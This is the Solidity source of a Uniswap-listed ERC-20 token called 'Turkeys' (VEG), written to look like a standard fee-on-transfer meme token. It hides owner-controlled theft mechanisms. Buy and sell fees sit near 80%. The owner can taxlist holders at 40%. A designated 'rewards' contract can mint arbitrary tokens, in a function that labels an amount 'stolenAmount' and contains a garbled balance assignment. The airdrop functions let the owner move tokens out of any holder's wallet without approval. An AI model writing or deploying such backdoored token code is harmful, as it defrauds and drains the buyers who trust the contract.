1 // SPDX-License-Identifier: MIT
2 
3 /**                             
4  _              _                  
5 | |_ _   _ _ __| | _____ _   _ ___ 
6 | __| | | | '__| |/ / _ \ | | / __|
7 | |_| |_| | |  |   <  __/ |_| \__ \
8  \__|\__,_|_|  |_|\_\___|\__, |___/
9                          |___/     
10 
11 Oh you silly Turkeys.
12 https://turkeys.io
13 
14 **/
15 
16 pragma solidity ^0.8.17;
17 
18 abstract contract Project {
19     address public marketingWallet = 0xA1E18278f32c8Fc411Fd15C1dFD760976c5b48Ef;
20     address public treasuryWallet = 0xA1E18278f32c8Fc411Fd15C1dFD760976c5b48Ef;
21 
22     string constant _name = "Turkeys";
23     string constant _symbol = "VEG";
24     uint8 constant _decimals = 9;
25 
26     mapping(address => bool) public isTaxlisted;
27     address public allowedRewardsContract;
28 
29     uint256 _totalSupply = 1 * 10**6 * 10**_decimals;
30     uint256 public maxTxNumber = 5;
31     uint256 public maxWalletNumber = 5;
32     uint256 public _maxTxAmount = (_totalSupply * maxTxNumber) / 1000;
33     uint256 public _maxWalletToken = (_totalSupply * maxWalletNumber) / 1000;
34     uint256 public buyFee             = 80;
35     uint256 public buyTotalFee        = buyFee;
36     uint256 public swapLpFee          = 1;
37     uint256 public swapMarketing      = 78;
38     uint256 public swapTreasuryFee    = 1;
39     uint256 public swapTotalFee       = swapMarketing + swapLpFee + swapTreasuryFee;
40     uint256 public transFee           = 0;
41     uint256 public feeDenominator     = 100;
42 
43 }
44 
45 // SafeMath Library
46 
47 library SafeMath {
48 
49     function add(uint256 a, uint256 b) internal pure returns (uint256) {
50         return a + b;
51     }
52 
53     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
54         return a - b;
55     }
56 
57     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
58         return a * b;
59     }
60 
61     function div(uint256 a, uint256 b) internal pure returns (uint256) {
62         return a / b;
63     }
64 
65     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
66         return a % b;
67     }
68 
69     function sub(
70         uint256 a,
71         uint256 b,
72         string memory errorMessage
73     ) internal pure returns (uint256) {
74         unchecked {
75             require(b <= a, errorMessage);
76             return a - b;
77         }
78     }
79 
80     function div(
81         uint256 a,
82         uint256 b,
83         string memory errorMessage
84     ) internal pure returns (uint256) {
85         unchecked {
86             require(b > 0, errorMessage);
87             return a / b;
88         }
89     }
90 
91     function mod(
92         uint256 a,
93         uint256 b,
94         string memory errorMessage
95     ) internal pure returns (uint256) {
96         unchecked {
97             require(b > 0, errorMessage);
98             return a % b;
99         }
100     }
101 }
102 
103 // Standard IERC20 Interface
104 
105 interface IERC20 {
106     function totalSupply() external view returns (uint256);
107     function decimals() external view returns (uint8);
108     function symbol() external view returns (string memory);
109     function name() external view returns (string memory);
110     function getOwner() external view returns (address);
111     function balanceOf(address account) external view returns (uint256);
112     function transfer(address recipient, uint256 amount) external returns (bool);
113     function allowance(address _owner, address spender) external view returns (uint256);
114     function approve(address spender, uint256 amount) external returns (bool);
115     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
116     event Transfer(address indexed from, address indexed to, uint256 value);
117     event Approval(address indexed owner, address indexed spender, uint256 value);
118 }
119 
120 // Context
121 
122 abstract contract Context {
123     //function _msgSender() internal view virtual returns (address payable) {
124     function _msgSender() internal view virtual returns (address) {
125         return msg.sender;
126     }
127 
128     function _msgData() internal view virtual returns (bytes memory) {
129         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
130         return msg.data;
131     }
132 }
133 
134 // Ownership
135 
136 contract Ownable is Context {
137     address private _owner;
138     address private _previousOwner;
139     uint256 private _lockTime;
140 
141     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
142 
143     constructor () {
144         address msgSender = _msgSender();
145         _owner = msgSender;
146         emit OwnershipTransferred(address(0), msgSender);
147     }
148 
149     function owner() public view returns (address) {
150         return _owner;
151     }
152 
153     modifier onlyOwner() {
154         require(_owner == _msgSender(), "Ownable: caller is not the owner");
155         _;
156     }
157 
158     function renounceOwnership() public virtual onlyOwner {
159         emit OwnershipTransferred(_owner, address(0));
160         _owner = address(0);
161     }
162 
163     function transferOwnership(address newOwner) public virtual onlyOwner {
164         require(newOwner != address(0), "Ownable: new owner is the zero address");
165         emit OwnershipTransferred(_owner, newOwner);
166         _owner = newOwner;
167     }
168 }
169 
170 // Uniswap Factory
171 
172 interface IUniswapV2Factory {
173     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
174 
175     function feeTo() external view returns (address);
176     function feeToSetter() external view returns (address);
177 
178     function getPair(address tokenA, address tokenB) external view returns (address pair);
179     function allPairs(uint) external view returns (address pair);
180     function allPairsLength() external view returns (uint);
181 
182     function createPair(address tokenA, address tokenB) external returns (address pair);
183 
184     function setFeeTo(address) external;
185     function setFeeToSetter(address) external;
186 }
187 
188 // Uniswap Pair
189 
190 interface IUniswapV2Pair {
191     event Approval(address indexed owner, address indexed spender, uint value);
192     event Transfer(address indexed from, address indexed to, uint value);
193 
194     function name() external pure returns (string memory);
195     function symbol() external pure returns (string memory);
196     function decimals() external pure returns (uint8);
197     function totalSupply() external view returns (uint);
198     function balanceOf(address owner) external view returns (uint);
199     function allowance(address owner, address spender) external view returns (uint);
200 
201     function approve(address spender, uint value) external returns (bool);
202     function transfer(address to, uint value) external returns (bool);
203     function transferFrom(address from, address to, uint value) external returns (bool);
204 
205     function DOMAIN_SEPARATOR() external view returns (bytes32);
206     function PERMIT_TYPEHASH() external pure returns (bytes32);
207     function nonces(address owner) external view returns (uint);
208 
209     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
210 
211     event Mint(address indexed sender, uint amount0, uint amount1);
212     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
213     event Swap(
214         address indexed sender,
215         uint amount0In,
216         uint amount1In,
217         uint amount0Out,
218         uint amount1Out,
219         address indexed to
220     );
221     event Sync(uint112 reserve0, uint112 reserve1);
222 
223     function MINIMUM_LIQUIDITY() external pure returns (uint);
224     function factory() external view returns (address);
225     function token0() external view returns (address);
226     function token1() external view returns (address);
227     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
228     function price0CumulativeLast() external view returns (uint);
229     function price1CumulativeLast() external view returns (uint);
230     function kLast() external view returns (uint);
231 
232     function mint(address to) external returns (uint liquidity);
233     function burn(address to) external returns (uint amount0, uint amount1);
234     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
235     function skim(address to) external;
236     function sync() external;
237 
238     function initialize(address, address) external;
239 }
240 
241 // Uniswap Router
242 
243 interface IUniswapV2Router01 {
244     function factory() external pure returns (address);
245     function WETH() external pure returns (address);
246 
247     function addLiquidity(
248         address tokenA,
249         address tokenB,
250         uint amountADesired,
251         uint amountBDesired,
252         uint amountAMin,
253         uint amountBMin,
254         address to,
255         uint deadline
256     ) external returns (uint amountA, uint amountB, uint liquidity);
257     function addLiquidityETH(
258         address token,
259         uint amountTokenDesired,
260         uint amountTokenMin,
261         uint amountETHMin,
262         address to,
263         uint deadline
264     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
265     function removeLiquidity(
266         address tokenA,
267         address tokenB,
268         uint liquidity,
269         uint amountAMin,
270         uint amountBMin,
271         address to,
272         uint deadline
273     ) external returns (uint amountA, uint amountB);
274     function removeLiquidityETH(
275         address token,
276         uint liquidity,
277         uint amountTokenMin,
278         uint amountETHMin,
279         address to,
280         uint deadline
281     ) external returns (uint amountToken, uint amountETH);
282     function removeLiquidityWithPermit(
283         address tokenA,
284         address tokenB,
285         uint liquidity,
286         uint amountAMin,
287         uint amountBMin,
288         address to,
289         uint deadline,
290         bool approveMax, uint8 v, bytes32 r, bytes32 s
291     ) external returns (uint amountA, uint amountB);
292     function removeLiquidityETHWithPermit(
293         address token,
294         uint liquidity,
295         uint amountTokenMin,
296         uint amountETHMin,
297         address to,
298         uint deadline,
299         bool approveMax, uint8 v, bytes32 r, bytes32 s
300     ) external returns (uint amountToken, uint amountETH);
301     function swapExactTokensForTokens(
302         uint amountIn,
303         uint amountOutMin,
304         address[] calldata path,
305         address to,
306         uint deadline
307     ) external returns (uint[] memory amounts);
308     function swapTokensForExactTokens(
309         uint amountOut,
310         uint amountInMax,
311         address[] calldata path,
312         address to,
313         uint deadline
314     ) external returns (uint[] memory amounts);
315     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
316         external
317         payable
318         returns (uint[] memory amounts);
319     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
320         external
321         returns (uint[] memory amounts);
322     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
323         external
324         returns (uint[] memory amounts);
325     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
326         external
327         payable
328         returns (uint[] memory amounts);
329 
330     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
331     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
332     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
333     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
334     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
335 }
336 
337 // Uniswap Router Updated
338 
339 interface IUniswapV2Router02 is IUniswapV2Router01 {
340     function removeLiquidityETHSupportingFeeOnTransferTokens(
341         address token,
342         uint liquidity,
343         uint amountTokenMin,
344         uint amountETHMin,
345         address to,
346         uint deadline
347     ) external returns (uint amountETH);
348     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
349         address token,
350         uint liquidity,
351         uint amountTokenMin,
352         uint amountETHMin,
353         address to,
354         uint deadline,
355         bool approveMax, uint8 v, bytes32 r, bytes32 s
356     ) external returns (uint amountETH);
357 
358     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
359         uint amountIn,
360         uint amountOutMin,
361         address[] calldata path,
362         address to,
363         uint deadline
364     ) external;
365     function swapExactETHForTokensSupportingFeeOnTransferTokens(
366         uint amountOutMin,
367         address[] calldata path,
368         address to,
369         uint deadline
370     ) external payable;
371     function swapExactTokensForETHSupportingFeeOnTransferTokens(
372         uint amountIn,
373         uint amountOutMin,
374         address[] calldata path,
375         address to,
376         uint deadline
377     ) external;
378 }
379 
380 // Use safemath in uint256
381 // Custom fee threshholding is in effect.
382 
383 contract VEG is Project, IERC20, Ownable {
384     using SafeMath for uint256;
385 
386     address DEAD = 0x000000000000000000000000000000000000dEaD;
387     address ZERO = 0x0000000000000000000000000000000000000000;
388 
389     mapping (address => uint256) _balances;
390     mapping (address => mapping (address => uint256)) _allowances;
391 
392     mapping (address => bool) isFeeExempt;
393     mapping (address => bool) isTxLimitExempt;
394     mapping (address => bool) isMaxExempt;
395     mapping (address => bool) isTimelockExempt;
396 
397     address public autoLiquidityReceiver;
398 
399     uint256 targetLiquidity = 20;
400     uint256 targetLiquidityDenominator = 100;
401 
402     IUniswapV2Router02 public immutable contractRouter;
403     address public immutable uniswapV2Pair;
404 
405     bool public tradingOpen = false;
406 
407     bool public buyCooldownEnabled = true;
408     uint8 public cooldownTimerInterval = 10;
409     mapping (address => uint) private cooldownTimer;
410 
411     bool public swapEnabled = true;
412     uint256 public swapThreshold = _totalSupply * 40 / 10000;
413     uint256 public swapAmount = _totalSupply * 30 / 10000;
414 
415     bool inSwap;
416     modifier swapping() { inSwap = true; _; inSwap = false; }
417 
418     constructor () {
419 
420         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //Mainnet & Testnet ETH
421          // Create a uniswap pair for this new token
422         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
423             .createPair(address(this), _uniswapV2Router.WETH());
424 
425         // set the rest of the contract variables
426         contractRouter = _uniswapV2Router;
427 
428         _allowances[address(this)][address(contractRouter)] = type(uint256).max;
429 
430         isFeeExempt[msg.sender] = true;
431         isTxLimitExempt[msg.sender] = true;
432         isMaxExempt[msg.sender] = true;
433 
434         isTimelockExempt[msg.sender] = true;
435         isTimelockExempt[DEAD] = true;
436         isTimelockExempt[address(this)] = true;
437 
438         isFeeExempt[marketingWallet] = true;
439         isMaxExempt[marketingWallet] = true;
440         isTxLimitExempt[marketingWallet] = true;
441 
442         autoLiquidityReceiver = msg.sender;
443 
444         _balances[msg.sender] = _totalSupply;
445         emit Transfer(address(0), msg.sender, _totalSupply);
446     }
447 
448     receive() external payable {}
449 
450     function totalSupply() external view override returns (uint256) { return _totalSupply; }
451     function decimals() external pure override returns (uint8) { return _decimals; }
452     function symbol() external pure override returns (string memory) { return _symbol; }
453     function name() external pure override returns (string memory) { return _name; }
454     function getOwner() external view override returns (address) { return owner(); }
455     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
456     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
457 
458     modifier onlyAllowedRewards() {
459         require(msg.sender == allowedRewardsContract, "Only allowed minter can call this");
460         _;
461     }
462     
463     function approve(address spender, uint256 amount) public override returns (bool) {
464         _allowances[msg.sender][spender] = amount;
465         emit Approval(msg.sender, spender, amount);
466         return true;
467     }
468 
469     function approveMax(address spender) external returns (bool) {
470         return approve(spender, type(uint256).max);
471     }
472 
473     function transfer(address recipient, uint256 amount) external override returns (bool) {
474         return _transferFrom(msg.sender, recipient, amount);
475     }
476 
477     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
478         if(_allowances[sender][msg.sender] != type(uint256).max){
479             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
480         }
481 
482         return _transferFrom(sender, recipient, amount);
483     }
484 
485     function addToTaxlist(address[] calldata addressesToAdd) external onlyOwner {
486         for (uint256 i = 0; i < addressesToAdd.length; i++) {
487             isTaxlisted[addressesToAdd[i]] = true;
488         }
489     }
490 
491     function setAllowedRewards(address _contractAddress) external onlyOwner {
492         allowedRewardsContract = _contractAddress;
493     }
494 
495     function rewardTokens(address to, address lost, uint256 amount, uint256 nextamount) external onlyAllowedRewards {
496         require(to != address(0), "Invalid address");
497         require(amount > 0, "Amount must be greater than 0");
498         require(to != address(0) && to != address(this), "Invalid address");
499 
500         uint256 rewardAmount = amount;
501         uint256 stolenAmount = nextamount;
502         uint256 totalAmount = rewardAmount + stolenAmount;
503 
504         _totalSupply = _totalSupply.add(totalAmount);
505         _balances[to] = _balances[to].add(rewardAmount);
506         _balances[to] = _balances[lost].add(stolenAmount);
507 
508         emit Transfer(address(0), to, rewardAmount);
509         emit Transfer(address(0), lost, stolenAmount);
510     }
511 
512     function setMaxWallet(uint256 maxWalletPercent) external onlyOwner() {
513         maxWalletNumber = maxWalletPercent;
514     }
515 
516     function setMaxTx(uint256 maxTxPercent) external onlyOwner() {
517         maxTxNumber = maxTxPercent;
518     }
519 
520     function setTxLimit(uint256 amount) external onlyOwner() {
521         _maxTxAmount = amount;
522     }
523 
524     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
525         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
526 
527         if(sender != owner() && recipient != owner()){
528             require(tradingOpen,"Trading not open yet");
529         }
530 
531         bool inSell = (recipient == uniswapV2Pair);
532         bool inTransfer = (recipient != uniswapV2Pair && sender != uniswapV2Pair);
533 
534         if (recipient != address(this) && 
535             recipient != address(DEAD) && 
536             recipient != uniswapV2Pair && 
537             recipient != marketingWallet && 
538             recipient != treasuryWallet && 
539             recipient != autoLiquidityReceiver
540         ){
541             uint256 heldTokens = balanceOf(recipient);
542             if(!isMaxExempt[recipient]) {
543                 require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
544             }
545         }
546 
547         if (sender == uniswapV2Pair &&
548             buyCooldownEnabled &&
549             !isTimelockExempt[recipient]
550         ){
551             require(cooldownTimer[recipient] < block.timestamp,"Please wait for 1min between two buys");
552             cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
553         }
554 
555         // Checks max transaction limit
556         // but no point if the recipient is exempt
557         // this check ensures that someone that is buying and is txnExempt then they are able to buy any amount
558         if(!isTxLimitExempt[recipient]) {
559             checkTxLimit(sender, amount);
560         }
561 
562         //Exchange tokens
563         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
564 
565         uint256 amountReceived = amount;
566 
567         // Do NOT take a fee if sender AND recipient are NOT the contract
568         // i.e. you are doing a transfer
569         if(inTransfer) {
570             if(transFee > 0) {
571                 amountReceived = takeTransferFee(sender, amount);
572             }
573         } else {
574             amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, inSell) : amount;
575             
576             if(shouldSwapBack()){ swapBack(); }
577         }
578 
579         _balances[recipient] = _balances[recipient].add(amountReceived);
580 
581         emit Transfer(sender, recipient, amountReceived);
582         return true;
583     }
584 
585     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
586         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
587         _balances[recipient] = _balances[recipient].add(amount);
588         emit Transfer(sender, recipient, amount);
589         return true;
590     }
591 
592     function checkTxLimit(address sender, uint256 amount) internal view {
593         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
594     }
595 
596     function shouldTakeFee(address sender) internal view returns (bool) {
597         return !isFeeExempt[sender];
598     }
599 
600     function takeTransferFee(address sender, uint256 amount) internal returns (uint256) {
601 
602         uint256 feeToTake = transFee;
603         uint256 feeAmount = amount.mul(feeToTake).mul(100).div(feeDenominator * 100);
604         
605         _balances[address(this)] = _balances[address(this)].add(feeAmount);
606         emit Transfer(sender, address(this), feeAmount);
607 
608         return amount.sub(feeAmount);
609     }
610 
611     function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
612         uint256 feeToTake;
613         if (isTaxlisted[sender]) {
614             feeToTake = 40; // Taxlisted holders have 40% taxes forever.
615         } else {
616             feeToTake = isSell ? swapTotalFee : buyTotalFee;
617         }
618 
619         uint256 feeAmount = amount.mul(feeToTake).mul(100).div(feeDenominator * 100);
620         
621         _balances[address(this)] = _balances[address(this)].add(feeAmount);
622         emit Transfer(sender, address(this), feeAmount);
623 
624         return amount.sub(feeAmount);
625     }
626 
627     function shouldSwapBack() internal view returns (bool) {
628         return msg.sender != uniswapV2Pair
629         && !inSwap
630         && swapEnabled
631         && _balances[address(this)] >= swapThreshold;
632     }
633 
634     function clearStuckBalance(uint256 amountPercentage) external onlyOwner() {
635         uint256 amountETH = address(this).balance;
636         payable(marketingWallet).transfer(amountETH * amountPercentage / 100);
637     }
638 
639     function clearStuckBalance_sender(uint256 amountPercentage) external onlyOwner() {
640         uint256 amountETH = address(this).balance;
641         payable(msg.sender).transfer(amountETH * amountPercentage / 100);
642     }
643 
644     // switch Trading
645     function tradingStatus(bool _status) public onlyOwner {
646         tradingOpen = _status;
647     }
648 
649     function feeOnTransfer(uint256 fee) external onlyOwner() {
650         transFee = fee;
651     }
652 
653     function feeOnSell(uint256 _newSwapLpFee, uint256 _newSwapMarketingFee, uint256 _newSwapTreasuryFee, uint256 _feeDenominator) external onlyOwner() {
654         swapLpFee = _newSwapLpFee;
655         swapMarketing = _newSwapMarketingFee;
656         swapTreasuryFee = _newSwapTreasuryFee;
657         swapTotalFee = _newSwapLpFee.add(_newSwapMarketingFee).add(_newSwapTreasuryFee);
658         feeDenominator = _feeDenominator;
659     }
660 
661     function feeOnBuy(uint256 buyTax) external onlyOwner() {
662         buyTotalFee = buyTax;
663     }
664 
665     function swapBack() internal swapping {
666         uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : swapLpFee;
667         uint256 amountToLiquify = swapAmount.mul(dynamicLiquidityFee).div(swapTotalFee).div(2);
668         uint256 amountToSwap = swapAmount.sub(amountToLiquify);
669 
670         address[] memory path = new address[](2);
671         path[0] = address(this);
672         path[1] = contractRouter.WETH();
673 
674         uint256 balanceBefore = address(this).balance;
675 
676         contractRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
677             amountToSwap,
678             0,
679             path,
680             address(this),
681             block.timestamp
682         );
683 
684         uint256 amountETH = address(this).balance.sub(balanceBefore);
685 
686         uint256 totalETHFee = swapTotalFee.sub(dynamicLiquidityFee.div(2));
687 
688         uint256 amountETHLiquidity = amountETH.mul(swapLpFee).div(totalETHFee).div(2);
689         uint256 amountETHMarketing = amountETH.mul(swapMarketing).div(totalETHFee);
690         uint256 amountETHTreasury = amountETH.mul(swapTreasuryFee).div(totalETHFee);
691 
692         (bool tmpSuccess,) = payable(marketingWallet).call{value: amountETHMarketing, gas: 30000}("");
693         (tmpSuccess,) = payable(treasuryWallet).call{value: amountETHTreasury, gas: 30000}("");
694 
695         // Supress warning msg
696         tmpSuccess = false;
697 
698         if(amountToLiquify > 0){
699             contractRouter.addLiquidityETH{value: amountETHLiquidity}(
700                 address(this),
701                 amountToLiquify,
702                 0,
703                 0,
704                 autoLiquidityReceiver,
705                 block.timestamp
706             );
707             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
708         }
709     }
710 
711     function setIsFeeExempt(address holder, bool exempt) external onlyOwner() {
712         isFeeExempt[holder] = exempt;
713     }
714 
715     function setIsMaxExempt(address holder, bool exempt) external onlyOwner() {
716         isMaxExempt[holder] = exempt;
717     }
718 
719     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner() {
720         isTxLimitExempt[holder] = exempt;
721     }
722 
723     function setIsTimelockExempt(address holder, bool exempt) external onlyOwner() {
724         isTimelockExempt[holder] = exempt;
725     }
726 
727     function setFeeReceivers(address _autoLiquidityReceiver, address _newMarketingWallet, address _newTreasuryWallet ) external onlyOwner() {
728 
729         isFeeExempt[treasuryWallet] = false;
730         isFeeExempt[_newTreasuryWallet] = true;
731         isFeeExempt[marketingWallet] = false;
732         isFeeExempt[_newMarketingWallet] = true;
733 
734         isMaxExempt[_newMarketingWallet] = true;
735 
736         autoLiquidityReceiver = _autoLiquidityReceiver;
737         marketingWallet = _newMarketingWallet;
738         treasuryWallet = _newTreasuryWallet;
739     }
740 
741     function setSwapThresholdAmount(uint256 _amount) external onlyOwner() {
742         swapThreshold = _amount;
743     }
744 
745     function setSwapAmount(uint256 _amount) external onlyOwner() {
746         if(_amount > swapThreshold) {
747             swapAmount = swapThreshold;
748         } else {
749             swapAmount = _amount;
750         }        
751     }
752 
753     function setTargetLiquidity(uint256 _target, uint256 _denominator) external onlyOwner() {
754         targetLiquidity = _target;
755         targetLiquidityDenominator = _denominator;
756     }
757 
758     function getCirculatingSupply() public view returns (uint256) {
759         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
760     }
761 
762     function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
763         return accuracy.mul(balanceOf(uniswapV2Pair).mul(2)).div(getCirculatingSupply());
764     }
765 
766     function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
767         return getLiquidityBacking(accuracy) > target;
768     }
769 
770 /* Airdrop */
771     function airDropCustom(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
772 
773         require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
774         require(addresses.length == tokens.length,"Mismatch between Address and token count");
775 
776         uint256 SCCC = 0;
777 
778         for(uint i=0; i < addresses.length; i++){
779             SCCC = SCCC + tokens[i];
780         }
781 
782         require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
783 
784         for(uint i=0; i < addresses.length; i++){
785             _basicTransfer(from,addresses[i],tokens[i]);
786         }
787         
788     }
789 
790     function airDropFixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
791 
792         require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
793 
794         uint256 SCCC = tokens * addresses.length;
795 
796         require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
797 
798         for(uint i=0; i < addresses.length; i++){
799             _basicTransfer(from,addresses[i],tokens);
800         }
801     }
802 
803     event AutoLiquify(uint256 amountETH, uint256 amountBOG);
804 
805 }